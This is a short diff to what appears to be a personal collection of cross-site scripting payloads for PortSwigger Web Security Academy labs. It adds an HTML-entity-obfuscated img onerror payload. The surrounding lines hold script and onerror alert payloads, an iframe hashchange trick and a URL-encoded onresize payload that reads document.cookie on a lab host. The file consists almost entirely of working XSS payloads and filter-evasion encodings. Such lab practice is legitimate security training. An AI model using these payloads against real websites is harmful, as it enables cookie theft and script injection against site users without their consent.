@@ -1,6 +1,8 @@
 <script>alert(document.domain)</script>
 <img src=1 onerror=alert(document.domain)>
 
+<img src=x onerror="&#x61;lert(1)">
+
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 
 <iframe src="https://0aeb00f103c39b528042766700030070.web-security-academy.net/?search=%3Cwhatever%2Fonresize%3D%27var+a%3Dalert%3Ba%28document.cookie%29%27+width%3D%27200px%27+height%3D%27400px%27%3E" onload="this.style.width='100px'"></iframe>
